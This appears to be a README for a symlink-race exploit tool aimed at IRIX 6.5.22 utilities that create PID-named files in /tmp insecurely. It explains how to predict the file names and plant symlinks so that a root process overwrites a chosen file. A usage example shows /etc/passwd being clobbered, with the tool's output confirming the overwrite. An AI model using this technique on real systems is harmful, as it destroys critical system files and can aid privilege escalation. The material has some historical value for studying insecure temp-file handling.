I've been looking around on my SGI Indy running IRIX 6.5.22 checking system utitlities for the use of /tmp.  I've noticed some scripts
using $$ to generate a unique file name in /tmp. I wrote this simple tool to generate links in /tmp in an attempt to clobber
files if the root user were to run any of the vulnerable utitliies.

This code creates an x number of symlinks using the pid in the filename in order to clobber system files by linking to them when programs use /tmp in an insecure manner. This isn't really a problem on modern day unixes.  I've developed and tested it on an SGI Indy R5000 running IRIX 6.5.22.  After running it monitors the target file's modification time to determine if the exploitation succeeded. 
Also,  you can specify with a # sign where the PID appears in the file as some /tmp files the pid maybe between other characters and not always on the end of a file.  

e.g.
-f /tmp/cat_man#.log would be /tmp/cat_man12314.log etc..
```
larry@mathom:~/code/symlinker$ ./symlink -n 10 -f to_dos# -t /etc/passwd
Starting from our own process id: 259857
Symlinking /tmp/to_dos259857->/etc/passwd
Symlinking /tmp/to_dos259858->/etc/passwd
Symlinking /tmp/to_dos259859->/etc/passwd
Symlinking /tmp/to_dos259860->/etc/passwd
Symlinking /tmp/to_dos259861->/etc/passwd
Symlinking /tmp/to_dos259862->/etc/passwd
Symlinking /tmp/to_dos259863->/etc/passwd
Symlinking /tmp/to_dos259864->/etc/passwd
Symlinking /tmp/to_dos259865->/etc/passwd
Symlinking /tmp/to_dos259866->/etc/passwd
Symlinking /tmp/to_dos259867->/etc/passwd
Waiting on a write to one of our predicted links in /tmp or pid to grow past the links we created.
[+] The target file /etc/passwd has been over written!
[+] Modification time changed from Fri Oct 25 13:31:44 2019 to Sun Oct 27 02:39:16 2019

Cleaning up....
Unlinking -> /tmp/to_dos259867
Unlinking -> /tmp/to_dos259866
Unlinking -> /tmp/to_dos259865
Unlinking -> /tmp/to_dos259864
Unlinking -> /tmp/to_dos259863
Unlinking -> /tmp/to_dos259862
Unlinking -> /tmp/to_dos259861
Unlinking -> /tmp/to_dos259860
Unlinking -> /tmp/to_dos259859
Unlinking -> /tmp/to_dos259858
Unlinking -> /tmp/to_dos259857
```
